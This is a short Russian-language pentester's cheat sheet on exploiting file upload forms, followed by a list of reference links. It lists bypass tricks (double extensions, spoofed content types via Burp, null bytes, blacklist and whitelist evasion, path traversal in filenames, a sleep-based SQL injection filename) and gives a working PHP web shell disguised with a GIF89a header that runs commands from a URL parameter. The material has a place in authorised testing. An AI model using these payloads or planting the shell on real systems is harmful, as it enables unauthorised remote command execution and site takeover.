# FU
File Upload

Загрузка шелла в лоб s.php

Двойной расшиерние s.php.png

Изменение content-type injection technique, например, грузить s.php, а ставить content-type: image/png, или application/x-php, не забывать делать это на лету, перехватывая запрос в BURP

Null Byte Injection %00 (см https://www.hackingarticles.in/5-ways-file-upload-vulnerability-exploitation/)

Обход Blacklisting File Extensions PHp or PHP3 и так далее

Использовать в имени файла пути, например ../../../index.php а так же в расширении файла, например s.../../../../../.png -> s./../../../../../.png -> s./../../../../../png

Менять type="file" на type="url" в исходном коде 

Обход whiitlist - s.php.lolgif s.php.111\gif s.php\file.txt

sql inj - sleep(10).gif

GIF89a;
<?
system($_GET['cmd']); # shellcode goes here
?>


https://github.com/daffainfo/AllAboutBugBounty/blob/master/BypassFileUpload.md !!!


https://lwierzbicki.github.io/2020/06/10/from-file-upload-to-rce.html


https://medium.com/@satboy.fb/art-of-unrestricted-file-upload-exploitation-92ed28796d0
https://www.owasp.org/index.php/Unrestricted_File_Upload
https://www.owasp.org/index.php/Test_Upload_of_Malicious_Files_(OTG-BUSLOGIC-009)
https://www.owasp.org/index.php/Test_Upload_of_Unexpected_File_Types_(OTG-BUSLOGIC-008)
https://www.sans.org/reading-room/whitepapers/testing/web-application-file-upload-vulnerabilities-36487
https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/ !!!
https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf
https://www.slideshare.net/HackIT-ukraine/15-technique-to-exploit-file-upload-pages-ebrahim-hegazy
https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload

https://telegra.ph/Obhod-Cloudflare-WAF-pri-zagruzke-fajlov-07-11 оБХОД waf ПРИ ЗАГРУЗКЕ ФАЙЛОВ
